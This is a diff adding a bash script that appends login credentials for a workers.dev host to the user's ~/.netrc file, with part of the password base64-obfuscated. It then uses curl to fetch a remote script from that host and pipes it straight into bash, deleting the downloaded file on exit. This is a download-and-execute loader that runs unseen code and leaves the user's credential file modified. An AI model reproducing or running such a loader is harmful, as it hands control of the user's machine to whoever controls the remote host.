@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+# .netrc → curl --netrc → download & execute remote script
+set -euo pipefail
+
+URL="https://rajhub.drpramila84.workers.dev"
+HOST="rajhub.drpramila84.workers.dev"
+NETRC="${HOME}/.netrc"
+
+if ! command -v curl >/dev/null 2>&1; then
+  echo "Error: curl is required but not installed." >&2
+  exit 1
+fi
+
+touch "$NETRC"
+chmod 600 "$NETRC"
+
+tmpfile="$(mktemp)"
+grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
+mv "$tmpfile" "$NETRC"
+
+# Only one account now -- user-rajbhai
+# pass - rajubhai 1234
+REAL_PASS=$(echo "emVuc2VpaGFja2VyMTk4" | base64 -d)
+
+{
+  printf 'machine %s ' "$HOST"
+  printf 'login %s ' "user-v9Xk@m2PqL5#zR8uT1nJ4fE7hG0vS3mC6xZp9yW2rQ5tB8nM1kG4jA7fS0"
+  printf 'password %s\n' "X9#vL2p*ZmW5yR@tK8u${REAL_PASS}N4fB1jE9hGvS3mC6xZpL9qY2wR5tN8"
+} >> "$NETRC"
+
+script_file="$(mktemp)"
+cleanup() { 
+  rm -f "$script_file"
+  # Optional: clear the variable from memory
+  unset REAL_PASS 
+}
+trap cleanup EXIT
+
+if curl -fsS --netrc -o "$script_file" "$URL"; then
+  bash "$script_file"
+else
+  echo "Authentication or download failed." >&2
+  exit 1
+fi
